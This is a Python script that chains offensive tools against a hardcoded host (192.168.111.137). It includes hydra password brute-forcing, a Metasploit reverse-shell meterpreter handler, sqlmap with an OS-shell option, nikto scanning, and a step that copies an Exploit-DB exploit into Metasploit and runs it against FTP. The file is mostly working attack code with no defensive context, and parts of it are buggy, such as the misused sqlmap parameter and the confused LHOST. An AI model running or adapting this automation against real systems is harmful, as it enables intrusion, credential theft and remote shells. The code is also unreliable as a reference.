import subprocess
import os
import random , os 
import pexpect

# Function to get the most used port
def get_most_used_port():
    # This command uses the 'netstat' command to get the most used port
    result = subprocess.run(["netstat", "-n", "-a"], capture_output=True)
    output = result.stdout.decode()
    lines = output.split("\n")
    port_counts = {}
    for line in lines:
        if ":" in line:
            port = line.split(":")[-1].split("/")[0]
            if port in port_counts:
                port_counts[port] += 1
            else:
                port_counts[port] = 1
    most_used_port = max(port_counts, key=port_counts.get)
    return most_used_port

# Function to perform attack on a port using hydra
def attack_port_hydra(port):
    subprocess.run(["hydra", "-L", "users.txt", "-P", "passwords.txt", "192.168.111.137", str(port)])

# Function to perform attack on a port using metasploit
def attack_port_metasploit(port):
    subprocess.run(["msfconsole", "-x", f"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 192.168.111.137; set LPORT {port}; exploit; exit;"])

# Function to perform attack on a port using sqlmap
def attack_port_sqlmap():
    subprocess.run(["sqlmap", "-u", "http://192.168.111.137:80", "-p", "80", "--os-shell"])

# Function to perform attack on a port using Nikto
def attack_port_nikto(port):
    subprocess.run(["nikto", "-h", f"http://192.168.111.137:{port}"])

# Function to exploit a vulnerability using Metasploit
def exploit_vulnerability(path):
    # Create directories
    subprocess.run(["mkdir", "-p", "/root/.msf4/modules/exploits/unix/remote"])

    pwd = subprocess.run(["pwd"], capture_output=True)
    pwd = pwd.stdout.decode().strip()
    # Copy the exploit
    subprocess.run(["cp", pwd +"/exploitdb/exploits/"+ path, "/root/.msf4/modules/exploits/unix/remote"])

    # Run the updatedb command
    subprocess.run(["updatedb"])
    
    subprocess.run(["msfconsole", "-x", f"use exploit/{path}; set RHOST 192.168.111.137; set RPORT 21; exploit; exit;"])

    